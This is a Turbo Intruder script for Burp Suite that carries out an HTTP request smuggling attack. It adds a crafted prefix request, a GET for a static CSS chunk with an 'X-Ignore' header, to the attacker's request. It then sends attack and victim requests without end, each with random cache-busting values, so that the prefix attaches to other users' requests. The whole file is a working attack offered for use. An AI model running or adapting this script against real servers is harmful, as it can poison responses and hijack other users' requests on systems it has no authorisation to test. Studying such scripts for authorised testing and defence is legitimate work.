import random
import string

letters = string.ascii_lowercase + string.digits

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0
                           )
    engine.start()

    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /static/portal-zh-201901/_next/static/css/0f10595384378c8e0b17.chunk.css?id=%s HTTP/1.1
X-Ignore: X'''

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')

    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    victim = target.req

    while True:

        engine.queue(attack.replace("%s",''.join(random.choice(letters) for i in range(10))))
        for i in range(4):
            engine.queue(victim.replace("%s",''.join(random.choice(letters) for i in range(10))))
            time.sleep(0.05)
        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)
